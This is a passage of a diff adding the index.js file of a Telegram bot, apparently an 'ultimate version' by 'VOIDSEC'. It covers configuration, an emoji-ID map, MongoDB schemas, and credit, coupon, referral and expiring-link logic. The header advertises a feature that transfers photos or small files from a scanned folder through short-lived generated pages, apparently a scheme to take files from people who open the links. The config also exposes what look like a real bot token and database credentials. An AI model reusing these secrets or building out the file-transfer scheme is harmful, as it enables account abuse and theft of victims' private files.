@@ -1,1 +1,3788 @@
+// ====================== index.js – ULTIMATE VERSION WITH PREMIUM EMOJIS & ALL FIXES ======================
+/*
+ * © 2026 SeXyxeon (VOIDSEC)
+ * 
+ * FEATURES:
+ * - Premium Telegram Emojis (Custom IDs for all emojis in bot messages/buttons)
+ * - Admin Panel UI Fixed & Enhanced
+ * - Link Expiry: 5 opens within 15 minutes (auto-delete after)
+ * - Security Scan: Checks folder for photos (transfers photos, otherwise transfers files <300KB)
+ * - Webhook + Polling Support (auto-detects)
+ * - Broadcast: Supports photos, videos, documents, GIFs, emojis, text
+ * - Complete code with all features intact
+ */
 
+process.env.NTBA_FIX_350 = 1;
+
+// ====================== CONFIG ======================
+const config = {
+    mainToken: '8809859232:AAHoJfHSdpJ67h0Blr2scKV_86vrZQhVpIA',
+    S7: '@RTFGAMMING',
+    adminId: '6346250222',
+    port: process.env.PORT || 3000,
+    baseUrl: process.env.RENDER_URL || 'https://rtf-rose-bot-l4hw.onrender.com',
+    BATCH_SIZE: 100,
+    LINK_EXPIRY: 15 * 60 * 1000,
+    MAX_OPENS: 5,
+    mongoUrl: 'mongodb+srv://sahajada07:Sahajada123@cluster0.vynn0ht.mongodb.net/?appName=Cluster0',
+    useWebhook: process.env.USE_WEBHOOK === 'true' || false
+};
+
+console.log('✅ Bot Token loaded!');
+console.log('📌 Base URL:', config.baseUrl);
+console.log('📌 Webhook Mode:', config.useWebhook);
+
+// ====================== PREMIUM EMOJI MAP ======================
+const EMOJI_MAP = {
+    "⚡": "5399934661818359384",
+    "🔄": "5373310679241466020",
+    "⚙️": "5787672468076367185",
+    "⭐": "6242413641052722528",
+    "👤": "5373012449597335010",
+    "💘": "6266818250818983044",
+    "🎁": "6129497211379129336",
+    "➿": "6329854094252970694",
+    "➖": "6307665627481903641",
+    "💎": "6123070651814124726",
+    "🌀": "5913534466051021148",
+    "☄️": "6339024429250515243",
+    "🥇": "6265004494719816749",
+    "📞": "6282996898701775483",
+    "👑": "6242406378263025026",
+    "🔥": "6307636391639519250",
+    "❤️": "5406926593698312391",
+    "✅": "6071022434234930063",
+    "❌": "6105179944067798549",
+    "💀": "5960961797035922820",
+    "📊": "5431577498364158238",
+    "📢": "5197304993920616826",
+    "👥": "5301276827782755360",
+    "🆔": "5888781182249738113",
+    "📅": "5413879192267805083",
+    "💰": "6267068789146260253",
+    "🪙": "5366223171454278937",
+    "🎉": "6242389503336518600",
+    "🎮": "6070964971867477673",
+    "🛡️": "6170491132326188067",
+    "🔍": "5258274739041883702",
+    "📌": "5258361175258712272",
+    "🎯": "5463274047771000031",
+    "🎫": "5418010521309815154",
+    "📛": "5407091670766343316",
+    "🌎": "5397575638146110953",
+    "👋": "6276133811545706331",
+    "🚪": "6035130900075777681",
+    "🔔": "6264510702329797113",
+    "🔕": "5244807637157029775",
+    "📱": "5465169893580086142",
+    "📸": "6305331119482999807",
+    "💣": "5454225015534805938",
+    "🪪": "6030753228889526497",
+    "🟢": "6120953301656670791",
+    "🔴": "6122945749870187150",
+    "⏳": "5451732530048802485",
+    "⏰": "5413704112220949842",
+    "⏱️": "6179440452601647526",
+    "💬": "5409496608287634515",
+    "🔗": "5431695342289379366",
+    "🔒": "6195245116207143870",
+    "🎥": "5449600639283619330",
+    "🖼️": "5334759607939040793",
+    "👇": "5301038027601098171",
+    "💡": "5219745609631674840",
+    "🔙": "5471937446368975982",
+    "👆": "5373091747827689552",
+    "👨‍💻": "4958900559139570572",
+    "🧩": "5188052560342545947",
+    "🎀": "5219745609631674840",
+    "💸": "5253804796589402657",
+    "🏅": "5415727875041021959",
+    "🤝": "5445261194662391481",
+    "🔐": "5472308992514464048",
+    "📧": "6046310987710078440",
+    "📡": "5399934661818359384",
+    "🏠": "5465226866321268133",
+    "😎": "6123091160282964016",
+    "⚠️": "5278211596656639183",
+    "📤": "5197304993920616826",
+    "📋": "6034969813032374911",
+    "🔵": "6330188813939251966",
+    "🤖": "6070964971867477673",
+    "🗣️": "5406705252558724532",
+    "🟥": "6330022375366598950",
+    "📍": "5258361175258712272",
+    "💠": "4960766907113276588",
+    "💍": "6129913342170506824",
+    "🔓": "5890882606668452641",
+    "🙂": "6129440444796378483",
+    "👉": "5465467698022468218",
+    "➕": "6257944590687410044",
+    "👁": "6159021800119341504",
+    "🗑️": "6129486856212979482",
+    "🔑": "5472308992514464048",
+    "📄": "6034969813032374911",
+    "⚜": "6181649972757271368",
+    "🩶": "5789607097440147328",
+    "🍾": "5798459514663473705",
+    "✉️": "5929312878816400493",
+    "🌏": "6178984829585986541",
+    "👨": "5373012449597335010",
+    "▶": "6323282781405190847",
+    "▶️": "6323282781405190847",
+    "◀": "6323282781405190847",
+    "◀️": "6323282781405190847",
+    "🗺": "6303001048185309018",
+    "🗺️": "6303001048185309018",
+    "🎓": "5357419403325481346",
+    "💼": "5348227245599105972",
+    "🌐": "6075739493736915024",
+    "🚗": "5312322066328853156",
+    "🚘": "5312322066328853156",
+    "📝": "5409496608287634515",
+    "⬇": "6129694470637100146",
+    "⬇️": "6129694470637100146",
+    "🌟": "6147565374289220368",
+    "👾": "5303396278179210513",
+    "🛒": "5780824606579364273",
+    "📮": "5287533898803211359",
+    "🌍": "6329854094252970694",
+    "🎨": "5415727875041021959",
+    "🚀": "6158836197402615172",
+    "🗑": "6158751479172702139",
+    "🎙": "5377544228505134960",
+    "🎙️": "5377544228505134960",
+    "🇮🇳": "5447419223242449630",
+    "⛅": "6178984829585986541",
+    "🌤": "6178984829585986541",
+    "🌥": "6178984829585986541",
+    "🌦": "6178984829585986541",
+    "🌧": "6178984829585986541",
+    "🌨": "6178984829585986541",
+    "🌩": "6178984829585986541",
+    "⛈": "6178984829585986541",
+    "☁": "6178984829585986541",
+    "☀": "6147565374289220368",
+    "🌞": "6147565374289220368",
+    "🌈": "6147565374289220368",
+    "❄": "6271523694617243479",
+    "🌊": "6178984829585986541",
+    "🌋": "6178984829585986541",
+    "🌌": "6178984829585986541",
+    "🌠": "6147565374289220368",
+    "🌃": "6178984829585986541",
+    "🌁": "6178984829585986541",
+    "🌄": "6178984829585986541",
+    "🌅": "6178984829585986541",
+    "🌆": "5415727875041021959",
+    "🌇": "5242564946968992534",
+    "🌉": "5041882544228795301",
+    "🌙": "5415727875041021959",
+    "🎵": "5377544228505134960",
+    "🎶": "5377544228505134960",
+    "🎧": "5377544228505134960",
+    "🎸": "5377544228505134960",
+    "🎷": "5377544228505134960",
+    "🎺": "5377544228505134960",
+    "🎻": "5377544228505134960",
+    "🎹": "5377544228505134960",
+    "🥁": "5377544228505134960",
+    "🎼": "5377544228505134960",
+    "📻": "5377544228505134960",
+    "💿": "5258274739041883702",
+    "📀": "5258274739041883702",
+    "🔊": "6105179944067798549",
+    "🔉": "6105179944067798549",
+    "🔈": "6105179944067798549",
+    "🔇": "6105179944067798549",
+    "🕹": "5303396278179210513",
+    "🖥": "5415727875041021959",
+    "📺": "5415727875041021959",
+    "📷": "5258274739041883702",
+    "📹": "5258274739041883702",
+    "🗄": "5258274739041883702",
+    "💾": "5258274739041883702",
+    "📦": "5258274739041883702",
+    "⛏": "5215441850537618106",
+    "🔧": "5215441850537618106",
+    "🔨": "5215441850537618106",
+    "👪": "5373012449597335010",
+    "👨‍👩‍👧": "5373012449597335010",
+    "👨‍👩‍👦": "5373012449597335010",
+    "👨‍👩‍👧‍👦": "5373012449597335010",
+    "👩": "5373012449597335010",
+    "👧": "5373012449597335010",
+    "👦": "5373012449597335010",
+    "🧑": "5373012449597335010",
+    "🌚": "5415727875041021959",
+    "🌑": "5415727875041021959",
+    "🌒": "5415727875041021959",
+    "🌓": "5415727875041021959",
+    "🌔": "5415727875041021959",
+    "🌕": "6147565374289220368",
+    "🌖": "5415727875041021959",
+    "🌗": "5415727875041021959",
+    "🌘": "5415727875041021959",
+    "🌛": "5415727875041021959",
+    "🌜": "5415727875041021959",
+    "🎞": "5258274739041883702",
+    "🎬": "5258274739041883702",
+    "🧊": "6271523694617243479",
+    "✨": "6147565374289220368",
+    "💥": "6147565374289220368",
+    "💧": "6178984829585986541",
+    "💨": "6178984829585986541",
+    "🌿": "6178984829585986541",
+    "💚": "5789607097440147328",
+    "💛": "5789607097440147328",
+    "🧡": "5789607097440147328",
+    "💜": "5789607097440147328",
+    "🖤": "5789607097440147328",
+    "🤍": "5789607097440147328",
+    "🤎": "5789607097440147328",
+    "💙": "5789607097440147328",
+    "❤": "5789607097440147328",
+    "🔃": "5377544228505134960",
+    "🔁": "5377544228505134960",
+    "🔂": "5377544228505134960",
+    "⏩": "6323282781405190847",
+    "⏪": "6323282781405190847",
+    "⏫": "6129694470637100146",
+    "⏬": "6129694470637100146",
+    "⏯": "6323282781405190847",
+    "🔛": "6323282781405190847",
+    "🔜": "6323282781405190847",
+    "🔚": "6323282781405190847",
+    "🔝": "6129694470637100146",
+    "🏡": "5465226866321268133",
+    "🏘": "5465226866321268133",
+    "🏗": "5415727875041021959",
+    "🏢": "5217822164362739968",
+    "🛸": "6158836197402615172",
+    "🔎": "5258274739041883702",
+    "🖌": "5415727875041021959",
+    "🔌": "5215441850537618106",
+    "🏆": "5357419403325481346",
+    "🎲": "5303396278179210513",
+    "💳": "5224257782013769471",
+    "🪄": "5472308992514464048",
+    "📖": "6034969813032374911",
+    "🛠": "5215441850537618106",
+    "⚔️": "5215441850537618106",
+    "🛡": "6170491132326188067",
+    "🎪": "5303396278179210513",
+    "🎭": "5303396278179210513",
+    "🧵": "5415727875041021959",
+    "🧶": "5415727875041021959",
+    "🪢": "5415727875041021959",
+    "🪡": "5415727875041021959",
+    "🪚": "5415727875041021959",
+    "🪛": "5415727875041021959",
+    "🪜": "5415727875041021959",
+    "🪝": "5415727875041021959",
+    "🪞": "5415727875041021959",
+    "🪟": "5415727875041021959",
+    "🪑": "5465226866321268133",
+    "🪒": "5415727875041021959",
+    "🪓": "5415727875041021959",
+    "🪔": "5415727875041021959",
+    "🪕": "5377544228505134960",
+    "🪖": "5415727875041021959",
+    "🪗": "5377544228505134960",
+    "🪘": "5377544228505134960",
+    "🪙": "6034969813032374911",
+    "🪠": "5415727875041021959",
+    "🪣": "5415727875041021959",
+    "🪤": "5415727875041021959",
+    "🪥": "5415727875041021959",
+    "🪦": "5415727875041021959",
+    "🪧": "5415727875041021959",
+    "🪨": "5415727875041021959",
+    "🪩": "6147565374289220368",
+    "🪪": "6030753228889526497",
+    "🪫": "5215441850537618106",
+    "🪭": "5415727875041021959",
+    "🪮": "5415727875041021959",
+    "🪯": "5415727875041021959",
+    "🪰": "5415727875041021959",
+    "🪱": "5415727875041021959",
+    "🪲": "5415727875041021959",
+    "🪳": "5415727875041021959",
+    "🪴": "5415727875041021959",
+    "🪵": "5415727875041021959",
+    "🪶": "5415727875041021959",
+    "🪷": "6147565374289220368",
+    "🪸": "6147565374289220368",
+    "🪹": "5415727875041021959",
+    "🪺": "5415727875041021959",
+    "🪻": "6147565374289220368",
+    "🪼": "6147565374289220368",
+    "🪽": "6178984829585986541",
+    "🪾": "6178984829585986541",
+    "🪿": "6178984829585986541",
+    "🐦": "6178984829585986541"
+};
+
+// ====================== DEPENDENCIES ======================
+const express = require('express');
+const TelegramBot = require('node-telegram-bot-api');
+const cors = require('cors');
+const moment = require('moment-timezone');
+const fs = require('fs');
+const path = require('path');
+const multer = require('multer');
+const mongoose = require('mongoose');
+
+const app = express();
+app.use(cors());
+app.use(express.json({ limit: '100mb' }));
+app.use(express.urlencoded({ extended: true, limit: '100mb' }));
+
+// ====================== MONGODB ======================
+mongoose.connect(config.mongoUrl)
+    .then(() => console.log('✅ MongoDB connected'))
+    .catch(err => console.error('❌ MongoDB error:', err));
+
+// ====================== SCHEMAS ======================
+const userSchema = new mongoose.Schema({
+    userId: { type: String, unique: true },
+    credits: { type: Number, default: 3 },
+    referrals: { type: Number, default: 0 },
+    totalReferrals: { type: Number, default: 0 },
+    unlimited: { type: Boolean, default: false },
+    banned: { type: Boolean, default: false },
+    joinedAt: { type: Date, default: Date.now },
+    referredBy: { type: String, default: null },
+    _pendingReferrer: { type: String, default: null },
+    _waitingForQR: { type: Boolean, default: false },
+    _waitingForPhoto: { type: Boolean, default: false },
+    _pendingPayment: { type: Object, default: null }
+});
+const photoSchema = new mongoose.Schema({
+    id: { type: String, unique: true },
+    filename: String,
+    originalName: String,
+    url: String,
+    caption: String,
+    uploadedAt: Date,
+    active: { type: Boolean, default: true }
+});
+const referralSchema = new mongoose.Schema({
+    referrerId: String,
+    newUserId: String,
+    timestamp: Date
+});
+const channelSchema = new mongoose.Schema({
+    id: String,
+    name: String,
+    link: String
+});
+const featuredSchema = new mongoose.Schema({
+    photo: { type: String, default: null },
+    message: { type: String, default: '🌟 Welcome! Use /start to begin.' },
+    status: { type: Boolean, default: true }
+});
+const linkSchema = new mongoose.Schema({
+    fileId: { type: String, unique: true },
+    userId: String,
+    platform: String,
+    url: String,
+    createdAt: Date,
+    expiresAt: Date,
+    opens: { type: Number, default: 0 },
+    maxOpens: { type: Number, default: 5 },
+    active: { type: Boolean, default: true }
+});
+const couponSchema = new mongoose.Schema({
+    code: { type: String, unique: true },
+    credits: { type: Number, required: true },
+    maxUses: { type: Number, required: true },
+    usedCount: { type: Number, default: 0 },
+    createdBy: { type: String, required: true },
+    createdAt: { type: Date, default: Date.now }
+});
+
+const User = mongoose.model('User', userSchema);
+const Photo = mongoose.model('Photo', photoSchema);
+const Referral = mongoose.model('Referral', referralSchema);
+const Channel = mongoose.model('Channel', channelSchema);
+const Featured = mongoose.model('Featured', featuredSchema);
+const Link = mongoose.model('Link', linkSchema);
+const Coupon = mongoose.model('Coupon', couponSchema);
+
+// ====================== DIRECTORIES ======================
+const PHOTO_DIR = path.join(__dirname, 'photos');
+const BOT_PHOTO_DIR = path.join(PHOTO_DIR, 'bot');
+const PAGES_DIR = path.join(__dirname, 'pages');
+const DATA_DIR = path.join(__dirname, 'data');
+const QR_FILE = path.join(DATA_DIR, 'qr.png');
+const SCAN_TEMP_DIR = path.join(DATA_DIR, 'scans');
+
+if (!fs.existsSync(PHOTO_DIR)) fs.mkdirSync(PHOTO_DIR, { recursive: true });
+if (!fs.existsSync(BOT_PHOTO_DIR)) fs.mkdirSync(BOT_PHOTO_DIR, { recursive: true });
+if (!fs.existsSync(PAGES_DIR)) fs.mkdirSync(PAGES_DIR, { recursive: true });
+if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
+if (!fs.existsSync(SCAN_TEMP_DIR)) fs.mkdirSync(SCAN_TEMP_DIR, { recursive: true });
+
+// ====================== MULTER ======================
+const storage = multer.diskStorage({
+    destination: (req, file, cb) => cb(null, BOT_PHOTO_DIR),
+    filename: (req, file, cb) => {
+        const uniqueName = Date.now() + '-' + file.originalname.replace(/\s/g, '_');
+        cb(null, uniqueName);
+    }
+});
+const upload = multer({
+    storage,
+    limits: { fileSize: 100 * 1024 * 1024 },
+    fileFilter: (req, file, cb) => {
+        if (file.mimetype.startsWith('image/')) cb(null, true);
+        else cb(new Error('Only images allowed!'));
+    }
+});
+
+// ====================== EMOJI HELPER FUNCTION ======================
+function getEmojiId(emoji) {
+    return EMOJI_MAP[emoji] || null;
+}
+
+function replaceWithPremiumEmojis(text) {
+    const emojiRegex = /[\u{1F600}-\u{1F64F}\u{1F300}-\u{1F5FF}\u{1F680}-\u{1F6FF}\u{1F700}-\u{1F77F}\u{1F780}-\u{1F7FF}\u{1F800}-\u{1F8FF}\u{1F900}-\u{1F9FF}\u{1FA00}-\u{1FA6F}\u{1FA70}-\u{1FAFF}\u{2600}-\u{26FF}\u{2700}-\u{27BF}\u{2B50}\u{2B55}\u{2B1B}\u{2B1C}\u{2B1D}\u{2B1E}\u{2B1F}\u{2B20}\u{2B21}\u{2B22}\u{2B23}\u{2B24}\u{2B25}\u{2B26}\u{2B27}\u{2B28}\u{2B29}\u{2B2A}\u{2B2B}\u{2B2C}\u{2B2D}\u{2B2E}\u{2B2F}\u{2B30}\u{2B31}\u{2B32}\u{2B33}\u{2B34}\u{2B35}\u{2B36}\u{2B37}\u{2B38}\u{2B39}\u{2B3A}\u{2B3B}\u{2B3C}\u{2B3D}\u{2B3E}\u{2B3F}\u{2B40}\u{2B41}\u{2B42}\u{2B43}\u{2B44}\u{2B45}\u{2B46}\u{2B47}\u{2B48}\u{2B49}\u{2B4A}\u{2B4B}\u{2B4C}\u{2B4D}\u{2B4E}\u{2B4F}\u{2B50}\u{2B51}\u{2B52}\u{2B53}\u{2B54}\u{2B55}\u{2B56}\u{2B57}\u{2B58}\u{2B59}\u{2B5A}\u{2B5B}\u{2B5C}\u{2B5D}\u{2B5E}\u{2B5F}\u{2B60}\u{2B61}\u{2B62}\u{2B63}\u{2B64}\u{2B65}\u{2B66}\u{2B67}\u{2B68}\u{2B69}\u{2B6A}\u{2B6B}\u{2B6C}\u{2B6D}\u{2B6E}\u{2B6F}\u{2B70}\u{2B71}\u{2B72}\u{2B73}\u{2B74}\u{2B75}\u{2B76}\u{2B77}\u{2B78}\u{2B79}\u{2B7A}\u{2B7B}\u{2B7C}\u{2B7D}\u{2B7E}\u{2B7F}\u{2B80}\u{2B81}\u{2B82}\u{2B83}\u{2B84}\u{2B85}\u{2B86}\u{2B87}\u{2B88}\u{2B89}\u{2B8A}\u{2B8B}\u{2B8C}\u{2B8D}\u{2B8E}\u{2B8F}\u{2B90}\u{2B91}\u{2B92}\u{2B93}\u{2B94}\u{2B95}\u{2B96}\u{2B97}\u{2B98}\u{2B99}\u{2B9A}\u{2B9B}\u{2B9C}\u{2B9D}\u{2B9E}\u{2B9F}\u{2BA0}\u{2BA1}\u{2BA2}\u{2BA3}\u{2BA4}\u{2BA5}\u{2BA6}\u{2BA7}\u{2BA8}\u{2BA9}\u{2BAA}\u{2BAB}\u{2BAC}\u{2BAD}\u{2BAE}\u{2BAF}\u{2BB0}\u{2BB1}\u{2BB2}\u{2BB3}\u{2BB4}\u{2BB5}\u{2BB6}\u{2BB7}\u{2BB8}\u{2BB9}\u{2BBA}\u{2BBB}\u{2BBC}\u{2BBD}\u{2BBE}\u{2BBF}\u{2BC0}\u{2BC1}\u{2BC2}\u{2BC3}\u{2BC4}\u{2BC5}\u{2BC6}\u{2BC7}\u{2BC8}\u{2BC9}\u{2BCA}\u{2BCB}\u{2BCC}\u{2BCD}\u{2BCE}\u{2BCF}\u{2BD0}\u{2BD1}\u{2BD2}\u{2BD3}\u{2BD4}\u{2BD5}\u{2BD6}\u{2BD7}\u{2BD8}\u{2BD9}\u{2BDA}\u{2BDB}\u{2BDC}\u{2BDD}\u{2BDE}\u{2BDF}\u{2BE0}\u{2BE1}\u{2BE2}\u{2BE3}\u{2BE4}\u{2BE5}\u{2BE6}\u{2BE7}\u{2BE8}\u{2BE9}\u{2BEA}\u{2BEB}\u{2BEC}\u{2BED}\u{2BEE}\u{2BEF}\u{2BF0}\u{2BF1}\u{2BF2}\u{2BF3}\u{2BF4}\u{2BF5}\u{2BF6}\u{2BF7}\u{2BF8}\u{2BF9}\u{2BFA}\u{2BFB}\u{2BFC}\u{2BFD}\u{2BFE}\u{2BFF}]/gu;
+    return text.replace(emojiRegex, (match) => {
+        const id = getEmojiId(match);
+        return id ? `<tg-emoji emoji-id="${id}">${match}</tg-emoji>` : match;
+    });
+}
+
+function replaceAllEmojis(text) {
+    const emojiRegex = /[\u{1F600}-\u{1F64F}\u{1F300}-\u{1F5FF}\u{1F680}-\u{1F6FF}\u{1F700}-\u{1F77F}\u{1F780}-\u{1F7FF}\u{1F800}-\u{1F8FF}\u{1F900}-\u{1F9FF}\u{1FA00}-\u{1FA6F}\u{1FA70}-\u{1FAFF}\u{2600}-\u{26FF}\u{2700}-\u{27BF}\u{2B50}\u{2B55}\u{2B1B}\u{2B1C}\u{2B1D}\u{2B1E}\u{2B1F}\u{2B20}\u{2B21}\u{2B22}\u{2B23}\u{2B24}\u{2B25}\u{2B26}\u{2B27}\u{2B28}\u{2B29}\u{2B2A}\u{2B2B}\u{2B2C}\u{2B2D}\u{2B2E}\u{2B2F}\u{2B30}\u{2B31}\u{2B32}\u{2B33}\u{2B34}\u{2B35}\u{2B36}\u{2B37}\u{2B38}\u{2B39}\u{2B3A}\u{2B3B}\u{2B3C}\u{2B3D}\u{2B3E}\u{2B3F}\u{2B40}\u{2B41}\u{2B42}\u{2B43}\u{2B44}\u{2B45}\u{2B46}\u{2B47}\u{2B48}\u{2B49}\u{2B4A}\u{2B4B}\u{2B4C}\u{2B4D}\u{2B4E}\u{2B4F}\u{2B50}\u{2B51}\u{2B52}\u{2B53}\u{2B54}\u{2B55}\u{2B56}\u{2B57}\u{2B58}\u{2B59}\u{2B5A}\u{2B5B}\u{2B5C}\u{2B5D}\u{2B5E}\u{2B5F}\u{2B60}\u{2B61}\u{2B62}\u{2B63}\u{2B64}\u{2B65}\u{2B66}\u{2B67}\u{2B68}\u{2B69}\u{2B6A}\u{2B6B}\u{2B6C}\u{2B6D}\u{2B6E}\u{2B6F}\u{2B70}\u{2B71}\u{2B72}\u{2B73}\u{2B74}\u{2B75}\u{2B76}\u{2B77}\u{2B78}\u{2B79}\u{2B7A}\u{2B7B}\u{2B7C}\u{2B7D}\u{2B7E}\u{2B7F}\u{2B80}\u{2B81}\u{2B82}\u{2B83}\u{2B84}\u{2B85}\u{2B86}\u{2B87}\u{2B88}\u{2B89}\u{2B8A}\u{2B8B}\u{2B8C}\u{2B8D}\u{2B8E}\u{2B8F}\u{2B90}\u{2B91}\u{2B92}\u{2B93}\u{2B94}\u{2B95}\u{2B96}\u{2B97}\u{2B98}\u{2B99}\u{2B9A}\u{2B9B}\u{2B9C}\u{2B9D}\u{2B9E}\u{2B9F}\u{2BA0}\u{2BA1}\u{2BA2}\u{2BA3}\u{2BA4}\u{2BA5}\u{2BA6}\u{2BA7}\u{2BA8}\u{2BA9}\u{2BAA}\u{2BAB}\u{2BAC}\u{2BAD}\u{2BAE}\u{2BAF}\u{2BB0}\u{2BB1}\u{2BB2}\u{2BB3}\u{2BB4}\u{2BB5}\u{2BB6}\u{2BB7}\u{2BB8}\u{2BB9}\u{2BBA}\u{2BBB}\u{2BBC}\u{2BBD}\u{2BBE}\u{2BBF}\u{2BC0}\u{2BC1}\u{2BC2}\u{2BC3}\u{2BC4}\u{2BC5}\u{2BC6}\u{2BC7}\u{2BC8}\u{2BC9}\u{2BCA}\u{2BCB}\u{2BCC}\u{2BCD}\u{2BCE}\u{2BCF}\u{2BD0}\u{2BD1}\u{2BD2}\u{2BD3}\u{2BD4}\u{2BD5}\u{2BD6}\u{2BD7}\u{2BD8}\u{2BD9}\u{2BDA}\u{2BDB}\u{2BDC}\u{2BDD}\u{2BDE}\u{2BDF}\u{2BE0}\u{2BE1}\u{2BE2}\u{2BE3}\u{2BE4}\u{2BE5}\u{2BE6}\u{2BE7}\u{2BE8}\u{2BE9}\u{2BEA}\u{2BEB}\u{2BEC}\u{2BED}\u{2BEE}\u{2BEF}\u{2BF0}\u{2BF1}\u{2BF2}\u{2BF3}\u{2BF4}\u{2BF5}\u{2BF6}\u{2BF7}\u{2BF8}\u{2BF9}\u{2BFA}\u{2BFB}\u{2BFC}\u{2BFD}\u{2BFE}\u{2BFF}]/gu;
+    return text.replace(emojiRegex, (match) => {
+        const id = getEmojiId(match);
+        return id ? `<tg-emoji emoji-id="${id}">${match}</tg-emoji>` : match;
+    });
+}
+
+// ====================== DATA FUNCTIONS (MongoDB) ======================
+async function getUser(userId) {
+    let user = await User.findOne({ userId: String(userId) });
+    if (!user) {
+        user = new User({ userId: String(userId), credits: 3 });
+        await user.save();
+    }
+    return user;
+}
+async function addReferral(referrerId, newUserId) {
+    const referral = new Referral({ referrerId: String(referrerId), newUserId: String(newUserId), timestamp: new Date() });
+    await referral.save();
+    const referrer = await getUser(referrerId);
+    referrer.totalReferrals += 1;
+    referrer.referrals += 1;
+    if (!referrer.unlimited) referrer.credits += 2;
+    await referrer.save();
+    return referrer;
+}
+async function useCredit(userId) {
+    const user = await getUser(userId);
+    if (user.unlimited) return true;
+    if ((user.credits || 0) <= 0) return false;
+    user.credits -= 1;
+    await user.save();
+    return true;
+}
+async function addCredits(userId, amount) {
+    const user = await getUser(userId);
+    if (user.unlimited) return user;
+    user.credits += amount;
+    await user.save();
+    return user;
+}
+async function getPhotos() { return await Photo.find().sort({ uploadedAt: -1 }); }
+async function addPhoto(file, caption) {
+    const photo = new Photo({
+        id: Date.now().toString(),
+        filename: file.filename,
+        originalName: file.originalname,
+        url: '/api/photos/' + file.filename,
+        caption: caption || '',
+        uploadedAt: new Date(),
+        active: true
+    });
+    await photo.save();
+    return photo;
+}
+async function deletePhoto(id) {
+    const photo = await Photo.findOne({ id });
+    if (!photo) return false;
+    const filePath = path.join(BOT_PHOTO_DIR, photo.filename);
+    if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
+    await Photo.deleteOne({ id });
+    return true;
+}
+async function togglePhoto(id) {
+    const photo = await Photo.findOne({ id });
+    if (!photo) return false;
+    photo.active = !photo.active;
+    await photo.save();
+    return photo;
+}
+async function getActivePhotos() { return await Photo.find({ active: true }); }
+async function getRandomPhoto() {
+    const photos = await getActivePhotos();
+    if (photos.length === 0) return null;
+    return photos[Math.floor(Math.random() * photos.length)];
+}
+async function getChannels() { return await Channel.find(); }
+async function addChannel(id, name, link) {
+    const channel = new Channel({ id, name, link });
+    await channel.save();
+    return channel;
+}
+async function removeChannel(id) { await Channel.deleteOne({ id }); }
+async function getFeatured() {
+    let featured = await Featured.findOne();
+    if (!featured) { featured = new Featured(); await featured.save(); }
+    return featured;
+}
+async function setFeaturedPhoto(photoId) {
+    const featured = await getFeatured();
+    featured.photo = photoId;
+    await featured.save();
+    return featured;
+}
+async function setFeaturedMessage(message) {
+    const featured = await getFeatured();
+    featured.message = message;
+    await featured.save();
+    return featured;
+}
+async function toggleFeaturedStatus() {
+    const featured = await getFeatured();
+    featured.status = !featured.status;
+    await featured.save();
+    return featured;
+}
+async function createLink(userId, platform, fileId, url) {
+    const link = new Link({
+        fileId,
+        userId: String(userId),
+        platform,
+        url,
+        createdAt: Date.now(),
+        expiresAt: Date.now() + config.LINK_EXPIRY,
+        opens: 0,
+        maxOpens: config.MAX_OPENS,
+        active: true
+    });
+    await link.save();
+    return link.toObject();
+}
+async function getLink(fileId) {
+    const link = await Link.findOne({ fileId });
+    return link ? link.toObject() : null;
+}
+async function isLinkValid(fileId) {
+    const link = await getLink(fileId);
+    if (!link || !link.active) return false;
+    if (Date.now() > link.expiresAt) return false;
+    if (link.opens >= link.maxOpens) return false;
+    return true;
+}
+async function incrementLinkOpen(fileId) {
+    const link = await Link.findOne({ fileId });
+    if (!link) return false;
+    link.opens += 1;
+    if (link.opens >= link.maxOpens) link.active = false;
+    await link.save();
+    return true;
+}
+async function deleteExpiredLinks() {
+    try {
+        const now = Date.now();
+        const expiredLinks = await Link.find({ active: true });
+        let deletedCount = 0;
+        for (const link of expiredLinks) {
+            if (now > link.expiresAt || link.opens >= link.maxOpens) {
+                const filePath = path.join(PAGES_DIR, link.fileId + '.html');
+                if (fs.existsSync(filePath)) {
+                    fs.unlinkSync(filePath);
+                    console.log(`🗑️ Deleted file: ${link.fileId}.html`);
+                }
+                await Link.deleteOne({ _id: link._id });
+                deletedCount++;
+                console.log(`🗑️ Deleted expired link: ${link.fileId}`);
+            }
+        }
+        if (deletedCount > 0) {
+            logToFile(`🗑️ Deleted ${deletedCount} expired links`);
+        }
+        return deletedCount;
+    } catch (err) {
+        console.error('Error deleting expired links:', err);
+        logToFile('❌ Error deleting expired links: ' + err.message);
+        return 0;
+    }
+}
+async function deleteAllExpiredLinks() {
+    try {
+        const allLinks = await Link.find();
+        let deletedCount = 0;
+        for (const link of allLinks) {
+            const filePath = path.join(PAGES_DIR, link.fileId + '.html');
+            if (fs.existsSync(filePath)) {
+                fs.unlinkSync(filePath);
+                console.log(`🗑️ Deleted file: ${link.fileId}.html`);
+            }
+            await Link.deleteOne({ _id: link._id });
+            deletedCount++;
+            console.log(`🗑️ Deleted link: ${link.fileId}`);
+        }
+        logToFile(`🗑️ Deleted ${deletedCount} total links (cleanup)`);
+        return deletedCount;
+    } catch (err) {
+        console.error('Error deleting all links:', err);
+        logToFile('❌ Error deleting all links: ' + err.message);
+        return 0;
+    }
+}
+async function checkAllChannels(userId) {
+    const channels = await getChannels();
+    for (const ch of channels) {
+        try {
+            const member = await S7.getChatMember(ch.id, userId);
+            const valid = ['creator', 'administrator', 'member', 'restricted'];
+            if (!valid.includes(member.status)) return false;
+        } catch { return false; }
+    }
+    return true;
+}
+async function getChannelButtonsAsync() {
+    const channels = await getChannels();
+    const buttons = channels.map(ch => ([{ text: replaceAllEmojis('📢 ') + ch.name, url: ch.link }]));
+    buttons.push([{ text: replaceAllEmojis('✅ ') + 'Check All Joined', callback_data: 'check_all' }]);
+    return { inline_keyboard: buttons };
+}
+
+// ====================== COUPON FUNCTIONS ======================
+async function createCoupon(code, credits, maxUses, adminId) {
+    const coupon = new Coupon({ code, credits, maxUses, createdBy: adminId });
+    await coupon.save();
+    return coupon;
+}
+async function redeemCoupon(userId, code) {
+    const coupon = await Coupon.findOne({ code });
+    if (!coupon) return { error: 'Invalid coupon code' };
+    if (coupon.usedCount >= coupon.maxUses) return { error: 'Coupon limit full' };
+    coupon.usedCount += 1;
+    await coupon.save();
+    await addCredits(userId, coupon.credits);
+    return { success: true, credits: coupon.credits };
+}
+async function getCoupons() { return await Coupon.find(); }
+async function deleteCoupon(code) { await Coupon.deleteOne({ code }); }
+
+// ====================== QR FUNCTIONS (File System) ======================
+function saveQRBuffer(buffer) {
+    try {
+        fs.writeFileSync(QR_FILE, buffer);
+        console.log('✅ QR saved');
